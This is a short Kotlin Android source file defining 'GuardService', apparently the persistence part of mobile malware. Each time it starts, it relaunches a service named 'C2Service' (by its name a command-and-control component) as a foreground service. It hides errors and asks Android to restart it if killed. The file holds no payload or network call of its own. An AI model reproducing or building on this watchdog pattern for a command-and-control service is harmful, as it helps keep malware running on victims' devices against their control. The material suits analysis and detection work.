package com.t.core
import android.app.Service
import android.content.Intent
import android.os.IBinder
class GuardService : Service() {
    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int { runCatching { VC.startFg(this, Intent(this, C2Service::class.java)) }; return START_STICKY }
    override fun onBind(i: Intent?): IBinder? = null
}
